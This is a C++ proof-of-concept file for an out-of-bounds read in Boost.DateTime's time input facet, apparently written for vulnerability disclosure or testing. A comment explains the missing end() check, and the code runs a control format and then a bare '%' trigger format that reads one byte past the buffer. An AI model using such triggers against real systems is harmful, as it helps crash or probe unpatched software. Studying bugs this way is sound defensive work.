// ---------------------------------------------------------------------------
// PoC: Boost.DateTime out-of-bounds read in time_input_facet::get
//      (boost/date_time/time_facet.hpp), triggered by a parse format string
//      that ends in a bare '%'.
//
// Affected: Boost ~1.35 - 1.54  (confirmed here on 1.44.0)   Fixed in: 1.55
// Class:    CWE-125 Out-of-bounds Read (off-by-one; missing end() check)
//
// Root cause (time_facet.hpp, time_input_facet::get):
//     const_itr itr(this->m_format.begin());
//     while (itr != this->m_format.end() && (sitr != stream_end)) {
//       if (*itr == '%') {
//         ++itr;                 // advance past '%'
//         if (*itr != '%') {     // <-- dereference with NO `itr != end()` check
//           switch(*itr) { ... } //     -> reads one element past m_format
//
// When the format is "%", the '%' is the final character: ++itr reaches end(),
// and the subsequent *itr reads one byte past the format buffer.
//
// Build & run:  ./build.sh      (see that script / README.md)
// Expected:     AddressSanitizer: heap-buffer-overflow ... READ of size 1
//               in ...time_input_facet::get ... time_facet.hpp:998
// ---------------------------------------------------------------------------
#include <cstdio>
#include <string>
#include <sstream>
#include <locale>
#include <boost/date_time/posix_time/posix_time.hpp>

using namespace boost::posix_time;

static void parse_with_format(const std::string& fmt, const char* label)
{
    std::printf("[*] %s: parsing with time_input_facet format = \"%s\"\n",
                label, fmt.c_str());
    std::stringstream ss;
    // Ownership of the facet is taken by the locale.
    ss.imbue(std::locale(ss.getloc(), new time_input_facet(fmt)));
    ss.str("2005-01-01 00:00:00");
    ptime pt(not_a_date_time);
    ss >> pt;                       // <-- get() walks the format; OOB read here
    std::printf("    parsed value: %s\n", to_simple_string(pt).c_str());
}

int main()
{
    // Control: a well-formed format does NOT over-read.
    parse_with_format("%Y-%m-%d %H:%M:%S", "control (well-formed)");

    // Trigger: format ends in a bare '%'  -> out-of-bounds read.
    // (Under AddressSanitizer this aborts here with heap-buffer-overflow.)
    parse_with_format("%", "TRIGGER (format ends in '%')");

    std::printf("[!] reached end without a crash "
                "(no sanitizer, or a patched Boost >= 1.55)\n");
    return 0;
}
